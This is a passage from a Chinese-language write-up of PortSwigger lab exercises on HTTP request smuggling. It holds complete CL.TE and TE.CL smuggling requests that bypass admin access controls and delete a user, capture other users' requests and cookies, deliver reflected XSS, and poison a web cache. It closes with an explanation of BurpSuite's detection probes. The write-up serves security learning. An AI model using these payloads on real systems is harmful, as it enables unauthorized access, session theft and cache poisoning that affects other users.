title="绕过前端服务器的安全控制"></a>绕过前端服务器的安全控制</h3><blockquote><p>在这个网络环境中，前端服务器负责实现安全控制，只有被允许的请求才能转发给后端服务器，而后端服务器无条件的相信前端服务器转发过来的全部请求，对每个请求都进行响应。因此我们可以利用HTTP请求走私，将无法访问的请求走私给后端服务器并获得响应。在这里有两个实验，分别是使用<code>CL-TE</code>和<code>TE-CL</code>绕过前端的访问控制。</p></blockquote><h4 id="CL-TE场景绕过"><a href="#CL-TE场景绕过" class="headerlink" title="CL.TE场景绕过"></a>CL.TE场景绕过</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。</p><p>先直接用CL.TE的构造报文，改下请求/admin接口即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 28</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br></pre></td></tr></table></figure><p>需要注意的一点是在这里，不需要我们对其他用户造成影响，因此走私过去的请求也必须是一个完整的请求，最后的两个<code>\r\n</code>不能丢弃。</p><p>发送两次，看到是向/admin接口访问了，但是返回说需要本地才能访问：</p><p><img src="/2020/03/11/浅析HRS漏洞/10.png" alt=""></p><p>在前面构造的报文中添加<code>Host: localhost</code>头字段即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 45</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure><p>发送两次，能成功访问/admin页面了，这里可看到carlos用户的信息及其删除的接口<code>/admin/delete?username=carlos</code>：</p><p><img src="/2020/03/11/浅析HRS漏洞/11.png" alt=""></p><p>构造最终的报文访问该删除接口即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca61fa51f4feb1d80a80fd1006f007b.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 68</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure><p>多发送几次，发现已经302了，此时是已经成功删除carlos用户的了：</p><p><img src="/2020/03/11/浅析HRS漏洞/12.png" alt=""></p><p>此时重新登录再次查看，发现已经没有carlos用户了：</p><p><img src="/2020/03/11/浅析HRS漏洞/13.png" alt=""></p><h4 id="TE-CL场景绕过"><a href="#TE-CL场景绕过" class="headerlink" title="TE.CL场景绕过"></a>TE.CL场景绕过</h4><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，后端服务器不支持TE。在/admin处有一个管理面板，但是前端服务器阻止对该面板的访问。要解决此问题，请将请求走私到访问管理面板并删除后端服务器的carlos用户。</p><p>和前面类似，不再多说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aca31f051f556e6780403e2f00570083.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">3d</span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p><img src="/2020/03/11/浅析HRS漏洞/14.png" alt=""></p><p><img src="/2020/03/11/浅析HRS漏洞/15.png" alt=""></p><h3 id="获取前端服务器重写请求字段"><a href="#获取前端服务器重写请求字段" class="headerlink" title="获取前端服务器重写请求字段"></a>获取前端服务器重写请求字段</h3><blockquote><p>在有的网络环境下，前端代理服务器在收到请求后，不会直接转发给后端服务器，而是先添加一些必要的字段，然后再转发给后端服务器。这些字段是后端服务器对请求进行处理所必须的，比如：</p><ul><li>描述TLS连接所使用的协议和密码</li><li>包含用户IP地址的XFF头</li><li>用户的会话令牌ID</li></ul><p>总之，如果不能获取到代理服务器添加或者重写的字段，我们走私过去的请求就不能被后端服务器进行正确的处理。那么我们该如何获取这些值呢。PortSwigger提供了一个很简单的方法，主要是三大步骤：</p><ul><li>找一个能够将请求参数的值输出到响应中的POST请求</li><li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li><li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li></ul></blockquote><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。/admin上有一个管理面板，但只有IP地址为127.0.0.1的用户才能访问。前端服务器将HTTP标头添加到包含其IP地址的传入请求中。它类似于X-Forwarded-For标头，但名称不同。要解决此问题，请向后端服务器走私一个请求，以显示前端服务器添加的标头。然后将包含添加的标头的请求走私到后端服务器，访问管理面板，并删除用户carlos。</p><p>我们像之前一样发包尝试通过Host头设置127.0.0.1来访问/admin，发现行不通：</p><p><img src="/2020/03/11/浅析HRS漏洞/18.png" alt=""></p><p>那就是说，后端服务器不是通过Host头而是通过其他可能是前端服务器添加的头来解析得到IP地址的。</p><p>此时，我们需要先找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能：</p><p>首先我们找一个能够将请求参数的值输出到响应中的POST请求，这里找到了网页的搜索功能：</p><p><img src="/2020/03/11/浅析HRS漏洞/16.png" alt=""></p><p>其中该请求报文如下，直接POST方式带上search参数访问/即可：</p><p><img src="/2020/03/11/浅析HRS漏洞/17.png" alt=""></p><p>接着构造如下报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 78</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Length: 100</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=mi1k7ea</span><br></pre></td></tr></table></figure><p>其中CL值为100，而后面数据的长度是不够100的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达100时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数的一部分，然后从响应中表示了出来，我们就能获取到了前端服务器重写的字段。</p><p>发送几次看到Search结果处返回了包含X-NntHAY-Ip头，它的值为IP地址：</p><p><img src="/2020/03/11/浅析HRS漏洞/19.png" alt=""></p><p>将之前CL.TE的构造报文的头改下就ok了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 52</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-NntHAY-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure><p>多发送几次就能成功访问到/admin页面：</p><p><img src="/2020/03/11/浅析HRS漏洞/20.png" alt=""></p><p>最后就是构造删除carlos用户的报文了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac991ff31ee2ddda80ad48c000dd0065.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 75</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">X-NntHAY-Ip: 127.0.0.1</span><br></pre></td></tr></table></figure><p>多发送几次即可：</p><p><img src="/2020/03/11/浅析HRS漏洞/21.png" alt=""></p><p><img src="/2020/03/11/浅析HRS漏洞/22.png" alt=""></p><h3 id="获取其他用户的请求"><a href="#获取其他用户的请求" class="headerlink" title="获取其他用户的请求"></a>获取其他用户的请求</h3><blockquote><p>在上一个实验中，我们通过走私一个不完整的请求来获取前端服务器添加的字段，而字段来自于我们后续发送的请求。换句话说，我们通过请求走私获取到了我们走私请求之后的请求。如果在我们的恶意请求之后，其他用户也进行了请求呢？我们寻找的这个POST请求会将获得的数据存储并展示出来呢？这样一来，我们可以走私一个恶意请求，将其他用户的请求的信息拼接到走私请求之后，并存储到网站中，我们再查看这些数据，就能获取用户的请求了。这可以用来偷取用户的敏感信息，比如账号密码等信息。</p></blockquote><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。为了解决实验室问题，请将请求走私到后端服务器，该请求将下一个用户的请求存储在应用程序中。然后检索下一个用户的请求，并使用受害用户的cookie来访问其帐户。</p><p>首先我们需要找到保存用户POST参数的页面，这里我们随便点击一篇博文查看，在提交评论的时候可以在文章评论一栏中保存我们POST的内容：</p><p><img src="/2020/03/11/浅析HRS漏洞/23.png" alt=""></p><p>对应如下接口：</p><p><img src="/2020/03/11/浅析HRS漏洞/24.png" alt=""></p><p>构造如下请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac0b1fda1f41126280f9132f0097008c.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://ac0b1fda1f41126280f9132f0097008c.web-security-academy.net/post/comment/confirmation?postId=2</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDt</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 270</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Host: ac661f531e07f12180eb2f1a009d0092.web-security-academy.net</span><br><span class="line">Cookie: session=JCjJgAksKxZgUSaXS9u7FJc8FqsuaNDt</span><br><span class="line">Content-Length: 400</span><br><span class="line"></span><br><span class="line">csrf=za3lvdP3pkuZE53Npssm5z7LN48uUQoR&amp;postId=2&amp;name=mi1k7ea&amp;email=email%40qq.com&amp;website=&amp;comment=</span><br></pre></td></tr></table></figure><p>其中CL值为400，而后面数据的长度是不够400的，因此后端服务器在接收到这个走私请求之后会认为这个请求还没传输完毕，继续等待传输。接着我们又继续发送相同的数据包，后端服务器接收到的是前端代理服务器已经处理好的请求，当接收的数据的总长度到达400时，后端服务器认为这个请求已经传输完毕了，然后进行响应。这样一来，后来的请求的一部分被作为了走私的请求的参数comment的一部分，然后在指定的博文的评论中返回显示出来。</p><p>多请求几次，然后到该博文中查看评论就看到包括其他用户请求的信息（这里是User-Agent不同来辨别的）：</p><p><img src="/2020/03/11/浅析HRS漏洞/25.png" alt=""></p><p><img src="/2020/03/11/浅析HRS漏洞/26.png" alt=""></p><h3 id="组合反射型XSS"><a href="#组合反射型XSS" class="headerlink" title="组合反射型XSS"></a>组合反射型XSS</h3><p>当HRS与反射型XSS组合利用时，就不再需要用户的交互来触发XSS了。</p><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。该应用程序在User-Agent头处存在反射型XSS。 为了解决实验室问题，请将请求走私到后端服务器，该请求导致下一个用户的请求接收到包含执行<code>alert(1)</code>的XSS漏洞的响应。</p><p>首先我们找下存在反射型XSS的页面，根据提示是User-Agent注入的XSS，而我们在查看具体文章的时候确实是找到了这个接口存在User-Agent的反射型XSS：</p><p><img src="/2020/03/11/浅析HRS漏洞/27.png" alt=""></p><p>为了让这个反射型XSS的利用更多深入，我们结合HRS，这样无需用户交互就能触发XSS。构造如下请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ac131fc91e3b433b80100743007900e8.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 74</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post?postId=4 HTTP/1.1</span><br><span class="line">User-Agent: &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;#</span><br></pre></td></tr></table></figure><p>发送几次：</p><p><img src="/2020/03/11/浅析HRS漏洞/29.png" alt=""></p><p>然后刷新界面就会触发XSS弹框：</p><p><img src="/2020/03/11/浅析HRS漏洞/28.png" alt=""></p><h3 id="组合Web缓存投毒攻击"><a href="#组合Web缓存投毒攻击" class="headerlink" title="组合Web缓存投毒攻击"></a>组合Web缓存投毒攻击</h3><blockquote><p>一般来说，前端服务器出于性能原因，会对后端服务器的一些资源进行缓存，如果存在HTTP请求走私漏洞，则有可能使用重定向来进行缓存投毒，从而影响后续访问的所有用户。</p></blockquote><p>Lab地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</a></p><p>题目要求：本实验涉及前端服务器和后端服务器，并且前端服务器不支持TE。前端服务器配置为缓存某些响应。为了解决此问题，请执行请求走私攻击，使缓存中毒，以便随后对JavaScript文件的请求将重定向到漏洞利用服务器。中毒的缓存应alert(document.cookie)。</p><p>实验环境提供了漏洞利用的辅助服务器，这里我们编辑响应的报文如下，为了方便看效果先将alert(document.cookie)改为alert(1)：</p><p><img src="/2020/03/11/浅析HRS漏洞/30.png" alt=""></p><p>构造如下POST请求走私报文，这里可以通过HRS攻击使得该网站的下一个请求重定向到漏洞利用服务器上的/post接口，而我们知道该接口响应返回的是前面设置的alert(1)内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 178</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post/next?postId=1 HTTP/1.1</span><br><span class="line">Host: ac521f121f4e12738066379201d30067.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br></pre></td></tr></table></figure><p>接着重放访问其中随意一个js文件的报文，这里选择/resources/js/tracking.js，当上一个HRS攻击报文发送后，由其中”GET /post/next?postId=1 HTTP/1.1”之后的内容将会和当前的访问/resources/js/tracking.js的报文拼接起来，而此时合并的报文实际是访问漏洞利用服务器的js文件即响应返回“alert(1)”，此时缓存的/resources/js/tracking.js文件的内容实际上就被投毒攻击为“alert(1)”：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /resources/js/tracking.js HTTP/1.1</span><br><span class="line">Host: aceb1fb41f8e127580ac37b400560067.web-security-academy.net</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Referer: https://aceb1fb41f8e127580ac37b400560067.web-security-academy.net/</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: session=mOFHLW0BPPkUKB4V858oSPuy3rTh9eUn</span><br></pre></td></tr></table></figure><p>上面POST和GET报文交替发送多次，然后点击第一篇博文查看，可以看到响应为缓存的漏洞利用服务器上的js文件：</p><p><img src="/2020/03/11/浅析HRS漏洞/31.png" alt=""></p><p>此时再访问主页，成功弹框，即缓存投毒攻击成功：</p><p><img src="/2020/03/11/浅析HRS漏洞/32.png" alt=""></p><h2 id="0x05-BurpSuite的HRS扫描原理"><a href="#0x05-BurpSuite的HRS扫描原理" class="headerlink" title="0x05 BurpSuite的HRS扫描原理"></a>0x05 BurpSuite的HRS扫描原理</h2><p>简单地说，BurpSuite是通过构造特定的数据包让后端服务器阻塞，通过超时机制来进行HRS漏洞检测的。</p><h3 id="CL-TE型HRS扫描原理"><a href="#CL-TE型HRS扫描原理" class="headerlink" title="CL.TE型HRS扫描原理"></a>CL.TE型HRS扫描原理</h3><p>针对CL.TE型HRS，BurpSuite发送以下报文进行检测：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">Z</span><br><span class="line">Q</span><br></pre></td></tr></table></figure><p>如果前端服务器是使用CL解析，那么根据数据包中的<code>Content-Length: 4</code>，前台服务器只会转发这个部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1\r\n</span><br><span class="line">Z</span><br></pre></td></tr></table></figure><p>而后端服务器使用TE解析，由于前端服务器转发过了的body中并未有<code>0\r\n\r\n</code>，因此后端服务器会一直等待下一个chunked块的大小值，但由于没有因此会造成约为10s的超时。</p><p>但是当数据包中的<code>Content-Length: 11</code>时，因为Q是一个无效的块大小值（chunked块大小值用十六进制表示，Q不能表示十六进制数），所以后端服务器中该请求结束，不会产生超时，双换行是因为部分系统没有换行会进行等待，原因未知：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ceshi.domain.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">Z</span><br><span 